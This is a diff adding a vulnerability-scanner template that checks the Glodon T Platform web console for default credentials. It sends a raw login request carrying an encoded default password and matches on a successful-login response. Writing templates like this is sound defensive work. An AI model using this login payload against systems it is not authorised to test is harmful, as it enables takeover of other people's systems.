@@ -1,0 +1,33 @@
+id: glodon-default-credentials
+info:
+  name: Glodon T Platform Default Credentials
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Glodon T platform web console has a default credential vulnerability that allows attackers to take over the target system.
+  reference:
+    - https://www.glodon.com/en/products
+http:
+  - raw:
+      - |
+        POST /Console/Account/LogOn HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        pws=30035003400360020007f002f007f002000620067006e006a006d
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"url\":\"/Console/Home/Index\""
+      - type: word
+        part: header
+        words:
+          - "ConsoleLogOn="
